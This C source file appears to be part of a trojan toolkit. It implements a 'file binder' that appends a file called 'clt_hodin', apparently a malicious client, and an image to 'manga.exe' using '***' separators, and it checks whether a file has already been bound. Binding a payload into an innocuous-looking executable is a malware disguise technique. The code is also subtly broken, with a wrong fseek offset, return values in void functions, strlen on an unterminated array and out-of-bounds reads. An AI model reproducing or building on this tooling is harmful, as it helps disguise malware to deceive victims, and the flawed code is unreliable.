#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/file_binder.h"

const gchar *chemin;

void bind_file(void)
{
    FILE *fp;

    int i;
    char *content;

    unsigned long size;

    fp = fopen(chemin, "rb");

    fseek(fp, 1, SEEK_END);
    size=ftell(fp);
    rewind(fp);

    content = (char *)malloc(size * sizeof(char));
    fread(content, size, 1, fp);

    for(i = 0; i < size; i++)
    {
        if(content[i]=='*' && content[i+1]=='*' && content[i+2] == '*')
        {
            fclose(fp);
            return 0;
        }
    }

    fclose(fp);

    binder();

    return 1;
}


void binder()
{
    char file1[] = "clt_hodin";
    char file2[] = "images/pic.jpeg";
    char file3[] = "manga.exe";

    char *content1;
    char *content2;

    char separator[]={ '*', '*', '*' };

    unsigned long size1;
    unsigned long size2;

    FILE *fp;

    /* Ouverture du fichioer en mode read binaire */
    if((fp = fopen(file1, "rb")) == NULL)
    {
        return;
    }

    /* calcul du poid du fichier */
    fseek(fp, 1, SEEK_END);
    size1 = ftell(fp);
    rewind(fp);


    content1 = (char *)malloc(size1 * sizeof(char));

    /* Lecteur du contenu du fichier + reception du contenu dans content1 */
    fread(content1, size1, 1, fp);
    fclose(fp);

    /* On recommence */
    if((fp = fopen(file2, "rb")) == NULL)
    {
        return;
    }

    fseek(fp, 1, SEEK_END);
    size2=ftell(fp);
    rewind(fp);

    content2 = (char *)malloc(size2 * sizeof(char));

    fread(content2, size2, 1, fp);

    /* Copy de l'exe dans file 3 ou pas ???? */
    //CopyFile("binder.exe", file3, FALSE);

    if((fp = fopen(file3, "ab")) == NULL)
    {
        return;
    }

    fwrite(separator, strlen(separator), 1, fp);
    fwrite(content1, size1, 1, fp);
    fwrite(separator, strlen(separator), 1, fp);
    fwrite(content2, size2, 1, fp);

    fclose(fp);
}
